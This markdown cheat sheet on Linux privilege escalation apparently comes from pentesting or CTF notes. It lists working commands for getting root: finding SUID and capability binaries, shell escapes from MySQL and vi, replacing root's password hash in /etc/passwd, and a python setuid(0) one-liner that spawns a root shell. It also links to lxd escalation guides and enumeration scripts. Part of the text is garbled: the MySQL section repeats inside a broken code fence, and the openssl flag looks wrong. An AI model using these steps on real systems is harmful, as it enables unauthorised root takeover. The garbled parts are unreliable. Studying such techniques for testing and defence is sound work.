# Linux Privilege Escalation

## Find SUID binaries

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. 

Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. 

In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Get a list of uncommon SUID binaries:

[https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py](https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py)

## Spawn shell from MySQL

If there is a MYSQL daemon running, and you can get into, you can get a shell as the same user as mysql is running:

```txt
If there is a MYSQL daemon running, and you can get into, you can get a shell as the same user as mysql is running:

```txt
mysql> \! /bin/sh
```

## Change root password

If you have access to `/etc/passwd` file, you can easily change any password by first generating a password:

```bash
openssl passwd -c $NEWPASS
```

And then put it into file like `root:$NEWCYPHERPASS:`

## Using `vi`

If you can execute `vi` as root, just enter `vi` and then type `:!/bin/bash`

## Containers

If you belong to `lxd` or `lxc` group, you can become root:

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

## Binaries with capabilities

```bash
getcap -r / 2>/dev/null
```

If `python3.8` has capabilities:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

## All-in-one scripts

* [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
* [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

